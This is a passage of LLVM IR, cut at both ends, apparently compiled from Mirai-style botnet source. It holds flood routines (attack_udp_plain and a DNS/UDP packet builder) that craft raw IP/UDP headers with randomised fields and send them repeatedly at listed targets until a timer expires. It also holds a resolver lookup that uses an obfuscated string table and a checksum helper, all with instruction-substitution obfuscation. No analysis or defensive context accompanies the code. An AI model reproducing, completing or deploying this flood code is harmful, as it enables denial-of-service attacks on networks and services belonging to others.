  %390 = load i16, i16* %19, align 2
  %391 = zext i16 %390 to i32
  %392 = icmp eq i32 %391, 65535
  br i1 %392, label %393, label %406

; <label>:393:                                    ; preds = %389
  %394 = call i32 @rand_next()
  %395 = xor i32 %394, -1
  %396 = xor i32 65535, -1
  %397 = xor i32 -1483087716, -1
  %398 = or i32 %395, %396
  %399 = or i32 -1483087716, %397
  %400 = xor i32 %398, -1
  %401 = and i32 %400, %399
  %402 = and i32 %394, 65535
  %403 = trunc i32 %401 to i16
  %404 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %405 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %404, i32 0, i32 1
  store i16 %403, i16* %405, align 2
  br label %406

; <label>:406:                                    ; preds = %393, %389
  %407 = load i16, i16* %20, align 2
  %408 = zext i16 %407 to i32
  %409 = icmp eq i32 %408, 65535
  br i1 %409, label %410, label %423

; <label>:410:                                    ; preds = %406
  %411 = call i32 @rand_next()
  %412 = xor i32 %411, -1
  %413 = xor i32 65535, -1
  %414 = xor i32 766067376, -1
  %415 = or i32 %412, %413
  %416 = or i32 766067376, %414
  %417 = xor i32 %415, -1
  %418 = and i32 %417, %416
  %419 = and i32 %411, 65535
  %420 = trunc i32 %418 to i16
  %421 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %422 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %421, i32 0, i32 0
  store i16 %420, i16* %422, align 2
  br label %423

; <label>:423:                                    ; preds = %410, %406
  %424 = load i8*, i8** %39, align 8
  %425 = load i8, i8* %21, align 1
  %426 = zext i8 %425 to i32
  call void @rand_alphastr(i8* %424, i32 %426)
  %427 = load i8*, i8** %39, align 8
  %428 = load i8, i8* %21, align 1
  %429 = zext i8 %428 to i64
  %430 = getelementptr inbounds i8, i8* %427, i64 %429
  store i8 0, i8* %430, align 1
  %431 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %432 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %431, i32 0, i32 7
  store i16 0, i16* %432, align 2
  %433 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %434 = bitcast %struct.iphdr* %433 to i16*
  %435 = call zeroext i16 @checksum_generic(i16* %434, i32 20)
  %436 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %437 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %436, i32 0, i32 7
  store i16 %435, i16* %437, align 2
  %438 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %439 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %438, i32 0, i32 3
  store i16 0, i16* %439, align 2
  %440 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %441 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %442 = bitcast %struct.udphdr* %441 to i8*
  %443 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %444 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %443, i32 0, i32 2
  %445 = load i16, i16* %444, align 2
  %446 = load i8, i8* %21, align 1
  %447 = zext i8 %446 to i64
  %448 = add i64 21, -7588696652069554194
  %449 = add i64 %448, %447
  %450 = sub i64 %449, -7588696652069554194
  %451 = add i64 21, %447
  %452 = sub i64 0, 2
  %453 = sub i64 %450, %452
  %454 = add i64 %450, 2
  %455 = load i32, i32* %23, align 4
  %456 = sext i32 %455 to i64
  %457 = sub i64 0, %456
  %458 = sub i64 %453, %457
  %459 = add i64 %453, %456
  %460 = sub i64 %458, -4284015215694525258
  %461 = add i64 %460, 4
  %462 = add i64 %461, -4284015215694525258
  %463 = add i64 %458, 4
  %464 = trunc i64 %462 to i32
  %465 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %440, i8* %442, i16 zeroext %445, i32 %464)
  %466 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %467 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %466, i32 0, i32 3
  store i16 %465, i16* %467, align 2
  %468 = load i32, i32* %24, align 4
  %469 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %470 = load i32, i32* %11, align 4
  %471 = sext i32 %470 to i64
  %472 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %469, i64 %471
  %473 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %472, i32 0, i32 0
  %474 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %473, i32 0, i32 2
  %475 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %474, i32 0, i32 0
  store i32 %468, i32* %475, align 4
  %476 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %477 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %476, i32 0, i32 1
  %478 = load i16, i16* %477, align 2
  %479 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %480 = load i32, i32* %11, align 4
  %481 = sext i32 %480 to i64
  %482 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %479, i64 %481
  %483 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %482, i32 0, i32 0
  %484 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %483, i32 0, i32 1
  store i16 %478, i16* %484, align 2
  %485 = load i32, i32* %12, align 4
  %486 = load i8*, i8** %35, align 8
  %487 = load i8, i8* %21, align 1
  %488 = zext i8 %487 to i64
  %489 = add i64 41, -4370976453430817510
  %490 = add i64 %489, %488
  %491 = sub i64 %490, -4370976453430817510
  %492 = add i64 41, %488
  %493 = sub i64 %491, 2288774983268210336
  %494 = add i64 %493, 2
  %495 = add i64 %494, 2288774983268210336
  %496 = add i64 %491, 2
  %497 = load i32, i32* %23, align 4
  %498 = sext i32 %497 to i64
  %499 = add i64 %495, 4240856653200121525
  %500 = add i64 %499, %498
  %501 = sub i64 %500, 4240856653200121525
  %502 = add i64 %495, %498
  %503 = sub i64 0, 4
  %504 = sub i64 %501, %503
  %505 = add i64 %501, 4
  %506 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %507 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %508 = load i32, i32* %11, align 4
  %509 = sext i32 %508 to i64
  %510 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %507, i64 %509
  %511 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %510, i32 0, i32 0
  %512 = bitcast %struct.sockaddr_in* %511 to %struct.sockaddr*
  store %struct.sockaddr* %512, %struct.sockaddr** %506, align 8
  %513 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %514 = load %struct.sockaddr*, %struct.sockaddr** %513, align 8
  %515 = call i64 @sendto(i32 %485, i8* %486, i64 %504, i32 16384, %struct.sockaddr* %514, i32 16)
  br label %516

; <label>:516:                                    ; preds = %423
  %517 = load i32, i32* %11, align 4
  %518 = sub i32 0, 1
  %519 = sub i32 %517, %518
  %520 = add nsw i32 %517, 1
  store i32 %519, i32* %11, align 4
  br label %337

; <label>:521:                                    ; preds = %337
  %522 = call i64 @time(i64* null) #6
  %523 = load i32, i32* %25, align 4
  %524 = sext i32 %523 to i64
  %525 = icmp sgt i64 %522, %524
  br i1 %525, label %526, label %527

; <label>:526:                                    ; preds = %521
  br label %528

; <label>:527:                                    ; preds = %521
  br label %336

; <label>:528:                                    ; preds = %526, %103, %97, %91
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  store i32 0, i32* %2, align 4
  call void @table_unlock_val(i8 zeroext 37)
  %11 = call i8* @table_retrieve_val(i32 37, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 37)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %106

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %18 = call i64 @read(i32 %16, i8* %17, i64 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  call void @table_unlock_val(i8 zeroext 38)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 38, i32* null)
  %25 = call i32 @util_stristr(i8* %22, i32 %23, i8* %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 38)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %105

; <label>:28:                                     ; preds = %15
  store i32 0, i32* %6, align 4
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

; <label>:30:                                     ; preds = %92, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %98

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

; <label>:41:                                     ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %45, %41
  br label %92

; <label>:50:                                     ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

; <label>:51:                                     ; preds = %50
  br label %52

; <label>:52:                                     ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %71, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %71, label %64

; <label>:64:                                     ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = sub i32 0, 1
  %68 = add i32 %66, %67
  %69 = sub nsw i32 %66, 1
  %70 = icmp eq i32 %65, %68
  br i1 %70, label %71, label %91

; <label>:71:                                     ; preds = %64, %60, %56
  %72 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %73 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %74 = load i32, i32* %4, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds i8, i8* %73, i64 %75
  %77 = load i32, i32* %6, align 4
  %78 = load i32, i32* %4, align 4
  %79 = add i32 %77, -1010961771
  %80 = sub i32 %79, %78
  %81 = sub i32 %80, -1010961771
  %82 = sub nsw i32 %77, %78
  call void @util_memcpy(i8* %72, i8* %76, i32 %81)
  %83 = load i32, i32* %6, align 4
  %84 = load i32, i32* %4, align 4
  %85 = add i32 %83, 1090709795
  %86 = sub i32 %85, %84
  %87 = sub i32 %86, 1090709795
  %88 = sub nsw i32 %83, %84
  %89 = sext i32 %87 to i64
  %90 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %89
  store i8 0, i8* %90, align 1
  store i8 1, i8* %9, align 1
  br label %98

; <label>:91:                                     ; preds = %64
  br label %92

; <label>:92:                                     ; preds = %91, %49
  %93 = load i32, i32* %6, align 4
  %94 = add i32 %93, -384408276
  %95 = add i32 %94, 1
  %96 = sub i32 %95, -384408276
  %97 = add nsw i32 %93, 1
  store i32 %96, i32* %6, align 4
  br label %30

; <label>:98:                                     ; preds = %71, %30
  %99 = load i8, i8* %9, align 1
  %100 = icmp ne i8 %99, 0
  br i1 %100, label %101, label %104

; <label>:101:                                    ; preds = %98
  %102 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %103 = call i32 @inet_addr(i8* %102) #6
  store i32 %103, i32* %1, align 4
  br label %117

; <label>:104:                                    ; preds = %98
  br label %105

; <label>:105:                                    ; preds = %104, %15
  br label %106

; <label>:106:                                    ; preds = %105, %0
  %107 = call i32 @rand_next()
  %108 = urem i32 %107, 4
  switch i32 %108, label %117 [
    i32 0, label %109
    i32 1, label %111
    i32 2, label %113
    i32 3, label %115
  ]

; <label>:109:                                    ; preds = %106
  %110 = call i32 @htonl(i32 134744072) #7
  store i32 %110, i32* %1, align 4
  br label %117

; <label>:111:                                    ; preds = %106
  %112 = call i32 @htonl(i32 1246898730) #7
  store i32 %112, i32* %1, align 4
  br label %117

; <label>:113:                                    ; preds = %106
  %114 = call i32 @htonl(i32 1074151430) #7
  store i32 %114, i32* %1, align 4
  br label %117

; <label>:115:                                    ; preds = %106
  %116 = call i32 @htonl(i32 67240450) #7
  store i32 %116, i32* %1, align 4
  br label %117

; <label>:117:                                    ; preds = %115, %113, %111, %109, %106, %101
  %118 = load i32, i32* %1, align 4
  ret i32 %118
}

declare i32 @open(i8*, i32, ...) #5

declare i64 @read(i32, i8*, i64) #5

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i32*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i16, align 2
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca i8*, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  %26 = load i8, i8* %7, align 1
  %27 = zext i8 %26 to i64
  %28 = call noalias i8* @calloc(i64 %27, i64 8) #6
  %29 = bitcast i8* %28 to i8**
  store i8** %29, i8*** %12, align 8
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 4) #6
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 7, i32 65535)
  %37 = trunc i32 %36 to i16
  store i16 %37, i16* %14, align 2
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 6, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 0, i32 512)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %16, align 2
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 1, i32 1)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = bitcast %struct.sockaddr_in* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 16, i32 4, i1 false)
  %51 = call i64 @time(i64* null) #6
  %52 = load i32, i32* %6, align 4
  %53 = sext i32 %52 to i64
  %54 = sub i64 0, %53
  %55 = sub i64 %51, %54
  %56 = add nsw i64 %51, %53
  %57 = trunc i64 %55 to i32
  store i32 %57, i32* %19, align 4
  %58 = load i16, i16* %15, align 2
  %59 = zext i16 %58 to i32
  %60 = icmp eq i32 %59, 65535
  br i1 %60, label %61, label %64

; <label>:61:                                     ; preds = %5
  %62 = call i32 @rand_next()
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %15, align 2
  br label %67

; <label>:64:                                     ; preds = %5
  %65 = load i16, i16* %15, align 2
  %66 = call zeroext i16 @htons(i16 zeroext %65) #7
  store i16 %66, i16* %15, align 2
  br label %67

; <label>:67:                                     ; preds = %64, %61
  store i32 0, i32* %11, align 4
  br label %68

; <label>:68:                                     ; preds = %183, %67
  %69 = load i32, i32* %11, align 4
  %70 = load i8, i8* %7, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %189

; <label>:73:                                     ; preds = %68
  %74 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %75 = load i8**, i8*** %12, align 8
  %76 = load i32, i32* %11, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i16, i16* %14, align 2
  %80 = zext i16 %79 to i32
  %81 = icmp eq i32 %80, 65535
  br i1 %81, label %82, label %91

; <label>:82:                                     ; preds = %73
  %83 = call i32 @rand_next()
  %84 = trunc i32 %83 to i16
  %85 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %86 = load i32, i32* %11, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i64 %87
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %88, i32 0, i32 0
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %89, i32 0, i32 1
  store i16 %84, i16* %90, align 2
  br label %100

; <label>:91:                                     ; preds = %73
  %92 = load i16, i16* %14, align 2
  %93 = call zeroext i16 @htons(i16 zeroext %92) #7
  %94 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %95 = load i32, i32* %11, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %94, i64 %96
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %97, i32 0, i32 0
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %98, i32 0, i32 1
  store i16 %93, i16* %99, align 2
  br label %100

; <label>:100:                                    ; preds = %91, %82
  %101 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %102 = load i32*, i32** %13, align 8
  %103 = load i32, i32* %11, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i32, i32* %102, i64 %104
  store i32 %101, i32* %105, align 4
  %106 = icmp eq i32 %101, -1
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %100
  br label %235

; <label>:108:                                    ; preds = %100
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %109, align 4
  %110 = load i16, i16* %15, align 2
  %111 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %110, i16* %111, align 2
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %113 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %112, i32 0, i32 0
  store i32 0, i32* %113, align 4
  %114 = load i32*, i32** %13, align 8
  %115 = load i32, i32* %11, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i32, i32* %114, i64 %116
  %118 = load i32, i32* %117, align 4
  %119 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %120 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %120, %struct.sockaddr** %119, align 8
  %121 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %122 = load %struct.sockaddr*, %struct.sockaddr** %121, align 8
  %123 = call i32 @bind(i32 %118, %struct.sockaddr* %122, i32 16) #6
  %124 = icmp eq i32 %123, -1
  br i1 %124, label %125, label %126

; <label>:125:                                    ; preds = %108
  br label %126

; <label>:126:                                    ; preds = %125, %108
  %127 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %127, i64 %129
  %131 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %130, i32 0, i32 2
  %132 = load i8, i8* %131, align 4
  %133 = zext i8 %132 to i32
  %134 = icmp slt i32 %133, 32
  br i1 %134, label %135, label %164

; <label>:135:                                    ; preds = %126
  %136 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %137 = load i32, i32* %11, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %136, i64 %138
  %140 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %139, i32 0, i32 1
  %141 = load i32, i32* %140, align 4
  %142 = call i32 @ntohl(i32 %141) #7
  %143 = call i32 @rand_next()
  %144 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %145 = load i32, i32* %11, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 2
  %149 = load i8, i8* %148, align 4
  %150 = zext i8 %149 to i32
  %151 = lshr i32 %143, %150
  %152 = add i32 %142, -2123742793
  %153 = add i32 %152, %151
  %154 = sub i32 %153, -2123742793
  %155 = add i32 %142, %151
  %156 = call i32 @htonl(i32 %154) #7
  %157 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %158 = load i32, i32* %11, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i64 %159
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i32 0, i32 0
  %162 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %161, i32 0, i32 2
  %163 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %162, i32 0, i32 0
  store i32 %156, i32* %163, align 4
  br label %164

; <label>:164:                                    ; preds = %135, %126
  %165 = load i32*, i32** %13, align 8
  %166 = load i32, i32* %11, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds i32, i32* %165, i64 %167
  %169 = load i32, i32* %168, align 4
  %170 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %171 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %172 = load i32, i32* %11, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i64 %173
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i32 0, i32 0
  %176 = bitcast %struct.sockaddr_in* %175 to %struct.sockaddr*
  store %struct.sockaddr* %176, %struct.sockaddr** %170, align 8
  %177 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %178 = load %struct.sockaddr*, %struct.sockaddr** %177, align 8
  %179 = call i32 @connect(i32 %169, %struct.sockaddr* %178, i32 16)
  %180 = icmp eq i32 %179, -1
  br i1 %180, label %181, label %182

; <label>:181:                                    ; preds = %164
  br label %182

; <label>:182:                                    ; preds = %181, %164
  br label %183

; <label>:183:                                    ; preds = %182
  %184 = load i32, i32* %11, align 4
  %185 = add i32 %184, -767126845
  %186 = add i32 %185, 1
  %187 = sub i32 %186, -767126845
  %188 = add nsw i32 %184, 1
  store i32 %187, i32* %11, align 4
  br label %68

; <label>:189:                                    ; preds = %68
  br label %190

; <label>:190:                                    ; preds = %234, %189
  store i32 0, i32* %11, align 4
  br label %191

; <label>:191:                                    ; preds = %222, %190
  %192 = load i32, i32* %11, align 4
  %193 = load i8, i8* %7, align 1
  %194 = zext i8 %193 to i32
  %195 = icmp slt i32 %192, %194
  br i1 %195, label %196, label %228

; <label>:196:                                    ; preds = %191
  %197 = load i8**, i8*** %12, align 8
  %198 = load i32, i32* %11, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds i8*, i8** %197, i64 %199
  %201 = load i8*, i8** %200, align 8
  store i8* %201, i8** %25, align 8
  %202 = load i8, i8* %17, align 1
  %203 = icmp ne i8 %202, 0
  br i1 %203, label %204, label %212

; <label>:204:                                    ; preds = %196
  %205 = load i8*, i8** %25, align 8
  %206 = load i16, i16* %16, align 2
  %207 = zext i16 %206 to i32
  call void @rand_alphastr(i8* %205, i32 %207)
  %208 = load i8*, i8** %25, align 8
  %209 = load i16, i16* %16, align 2
  %210 = zext i16 %209 to i64
  %211 = getelementptr inbounds i8, i8* %208, i64 %210
  store i8 0, i8* %211, align 1
  br label %212

; <label>:212:                                    ; preds = %204, %196
  %213 = load i32*, i32** %13, align 8
  %214 = load i32, i32* %11, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds i32, i32* %213, i64 %215
  %217 = load i32, i32* %216, align 4
  %218 = load i8*, i8** %25, align 8
  %219 = load i16, i16* %16, align 2
  %220 = zext i16 %219 to i64
  %221 = call i64 @send(i32 %217, i8* %218, i64 %220, i32 16384)
  br label %222

; <label>:222:                                    ; preds = %212
  %223 = load i32, i32* %11, align 4
  %224 = sub i32 %223, 35117290
  %225 = add i32 %224, 1
  %226 = add i32 %225, 35117290
  %227 = add nsw i32 %223, 1
  store i32 %226, i32* %11, align 4
  br label %191

; <label>:228:                                    ; preds = %191
  %229 = call i64 @time(i64* null) #6
  %230 = load i32, i32* %19, align 4
  %231 = sext i32 %230 to i64
  %232 = icmp sgt i64 %229, %231
  br i1 %232, label %233, label %234

; <label>:233:                                    ; preds = %228
  br label %235

; <label>:234:                                    ; preds = %228
  br label %190

; <label>:235:                                    ; preds = %233, %107
  ret void
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %25

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, 8320819993246857826
  %16 = add i64 %15, %13
  %17 = sub i64 %16, 8320819993246857826
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  br label %19

; <label>:19:                                     ; preds = %9
  %20 = load i32, i32* %4, align 4
  %21 = sub i32 %20, -443143338
  %22 = sub i32 %21, 2
  %23 = add i32 %22, -443143338
  %24 = sub i32 %20, 2
  store i32 %23, i32* %4, align 4
  br label %6

; <label>:25:                                     ; preds = %6
  %26 = load i32, i32* %4, align 4
  %27 = icmp eq i32 %26, 1
  br i1 %27, label %28, label %37

; <label>:28:                                     ; preds = %25
  %29 = load i16*, i16** %3, align 8
  %30 = load i16, i16* %29, align 2
  %31 = trunc i16 %30 to i8
  %32 = sext i8 %31 to i64
  %33 = load i64, i64* %5, align 8
  %34 = sub i64 0, %32
  %35 = sub i64 %33, %34
  %36 = add i64 %33, %32
  store i64 %35, i64* %5, align 8
  br label %37

; <label>:37:                                     ; preds = %28, %25
  %38 = load i64, i64* %5, align 8
  %39 = lshr i64 %38, 16
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = xor i64 65535, -1
  %43 = xor i64 8149492754812033692, -1
  %44 = or i64 %41, %42
  %45 = or i64 8149492754812033692, %43
  %46 = xor i64 %44, -1
  %47 = and i64 %46, %45
  %48 = and i64 %40, 65535
  %49 = sub i64 0, %47
  %50 = sub i64 %39, %49
  %51 = add i64 %39, %47
  store i64 %50, i64* %5, align 8
  %52 = load i64, i64* %5, align 8
  %53 = lshr i64 %52, 16
  %54 = load i64, i64* %5, align 8
  %55 = sub i64 0, %54
  %56 = sub i64 0, %53
  %57 = add i64 %55, %56
  %58 = sub i64 0, %57
  %59 = add i64 %54, %53
  store i64 %58, i64* %5, align 8
  %60 = load i64, i64* %5, align 8
